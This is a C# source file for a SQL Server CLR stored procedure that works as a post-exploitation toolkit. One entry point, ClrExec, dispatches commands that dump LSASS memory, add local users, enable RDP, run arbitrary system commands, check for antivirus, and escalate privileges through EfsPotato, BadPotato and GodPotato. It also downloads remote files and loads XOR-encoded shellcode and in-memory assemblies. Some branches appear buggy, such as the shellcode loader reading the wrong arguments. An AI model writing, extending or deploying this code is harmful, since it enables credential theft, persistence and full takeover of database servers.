using System;
using System.Data;
using System.Data.SqlClient;
using System.Data.SqlTypes;
using System.Text.RegularExpressions;
using Microsoft.SqlServer.Server;
using CLR_module;
using System.Text;
using static System.Net.Mime.MediaTypeNames;

public class StoredProcedures
{
    private static StringBuilder _buffer = new StringBuilder();
    [Microsoft.SqlServer.Server.SqlProcedure]
    public static void ClrExec(string cmd)
    {
        Patch.StartPatch();
        if (cmd.Contains("clr_dumplsass"))
        {
            string[] array = cmd.Split(' ');
            string environmentVariable = Environment.GetEnvironmentVariable("SystemRoot");
            string dumpDir = $"{environmentVariable}\\Temp\\";
            if (array.Length == 1)
            {
                dumplsass.run(dumpDir);
            }
            else
            {
                dumplsass.run(array[1]);
            }
        }
        else if (cmd.Contains("clr_pwd"))
        {
            basefun.GetCurrentDir();
        }
        else if (cmd.Contains("clr_ls"))
        {
            string[] array2 = cmd.Split(' ');
            if (array2.Length == 1)
            {
                basefun.ListDir("");
            }
            else
            {
                basefun.ListDir(array2[1]);
            }
        }
        else if (cmd.Contains("clr_cd"))
        {
            string[] array3 = cmd.Split(' ');
            basefun.SetCurrentDir(array3[1]);
        }
        else if (cmd.Contains("clr_ping"))
        {
            string[] array4 = cmd.Split(' ');
            basefun.ping(array4[1]);
        }
        else if (cmd.Contains("clr_rm"))
        {
            string[] array5 = cmd.Split(' ');
            basefun.DeleteFile(array5[1]);
        }
        else if (cmd.Contains("clr_cat"))
        {
            string[] array6 = cmd.Split(' ');
            basefun.GetContent(array6[1]);
        }
        else if (cmd.Contains("clr_ps"))
        {
            basefun.ListProcess();
        }
        else if (cmd.Contains("clr_netstat"))
        {
            basefun.netstat();
        }
        else if (cmd.Contains("clr_getav"))
        {
            getav.run();
        }
        else if (cmd.Contains("clr_rdp"))
        {
            RDP.run();
        }
        else if (cmd.Contains("clr_adduser"))
        {
            string[] array7 = cmd.Split(' ');
            string userName = array7[1];
            string password = array7[2];
            adduser.add(userName, password);
        }
        else if (cmd.Contains("clr_cmd"))
        {
            string cmd2 = cmd.Replace("clr_cmd ", "");
            exec.run(cmd2);
        }
        else if (cmd.Contains("clr_exec"))
        {
            string text = cmd.Replace("clr_exec ", "");
            if (text.Contains("-p"))
            {
                if (text.Contains("-a"))
                {
                    text = text.Replace("-p ", "");
                    string[] array8 = Regex.Split(text, "-a");
                    string proc = array8[0];
                    string arg = array8[1];
                    exec.run1(proc, arg);
                }
                else
                {
                    text = text.Replace("-p ", "");
                    exec.run1(text, "");
                }
            }
            else
            {
                exec.run(text);
            }
        }
        else if (cmd.Contains("clr_efspotato"))
        {
            string text2 = cmd.Replace("clr_efspotato ", "");
            if (text2.Contains("-p"))
            {
                if (text2.Contains("-a"))
                {
                    text2 = text2.Replace("-p ", "");
                    string[] array9 = Regex.Split(text2, "-a");
                    string program = array9[0];
                    string programArgs = array9[1];
                    Potato.EfsPotatoProg(program, programArgs);
                }
                else
                {
                    text2 = text2.Replace("-p ", "");
                    Potato.EfsPotatoProg(text2, "");
                }
            }
            else
            {
                Potato.EfsPotatoExec(text2);
            }
        }
        else if (cmd.Contains("clr_badpotato"))
        {
            string text3 = cmd.Replace("clr_badpotato ", "");
            if (text3.Contains("-p"))
            {
                if (text3.Contains("-a"))
                {
                    text3 = text3.Replace("-p ", "");
                    string[] array10 = Regex.Split(text3, "-a");
                    string prog = array10[0];
                    string arg2 = array10[1];
                    BadPotato.BadPotatoPorc(prog, arg2);
                }
                else
                {
                    text3 = text3.Replace("-p ", "");
                    BadPotato.BadPotatoPorc(text3, "");
                }
            }
            else
            {
                BadPotato.BadPotatoCMD(text3);
            }
        }
        else if (cmd.Contains("clr_godpotato"))
        {
            string text4 = cmd.Replace("clr_godpotato ", "");
            if (text4.Contains("-p"))
            {
                if (text4.Contains("-a"))
                {
                    text4 = text4.Replace("-p ", "");
                    string[] array10 = Regex.Split(text4, "-a");
                    string prog = array10[0];
                    string arg2 = array10[1];
                    GodPotatoRun.GodPotatoPorc(prog, arg2);
                }
                else
                {
                    text4 = text4.Replace("-p ", "");
                    BadPotato.BadPotatoPorc(text4, "");
                }
            }
            else
            {
                GodPotatoRun.GodPotatoPorc("", text4);
            }
        }
        else if (cmd.Contains("clr_download"))
        {
            string[] array11 = cmd.Split(' ');
            string url = array11[1];
            string localpath = array11[2];
            download.run(url, localpath);
        }
        else if (cmd.Contains("clr_combine"))
        {
            string[] array12 = cmd.Split(' ');
            string remoteFile = array12[1];
            basefun.run(remoteFile);
        }
        else if (cmd.Contains("clr_scloader"))
        {
            string text6 = cmd.Replace("clr_scloader ", "");
            string[] array13 = cmd.Split(' ');
            string payload = array13[0];
            string xor_key = array13[1];
            if (array13[0] == "clr_scloader")
            {
                string code = array13[1];
                string key = array13[2];
                
            }
            shellcodeloader.run(payload, xor_key);

        }
        else if (cmd.Contains("clr_assembly"))
        {
            try {
                string text5 = cmd.Replace("clr_assembly ", "");
                string[] array14 = text5.Split(' ');
                string payload = array14[0];
                string xor_key = array14[1];
                string result = AsmLoader.loadAsmBin(payload, xor_key);
                int maxLength = 4000;
                if (result.Length <= maxLength)
                {
                    SqlContext.Pipe.Send(result);
                }
                else
                {
                    int totalParts = (int)Math.Ceiling((double)result.Length / maxLength);
                    for (int i = 0; i < totalParts; i++)
                    {
                        int startIndex = i * maxLength;
                        int length = (i == totalParts - 1) ? result.Length - startIndex : maxLength;
                        string part = result.Substring(startIndex, length);
                        SqlContext.Pipe.Send(part);
                    }
                }
            } catch (Exception es)
            {
                SqlContext.Pipe.Send(es.ToString());
            }
           
        }
        else
        {
            SqlContext.Pipe.Send("Command error");
        }
    }
}
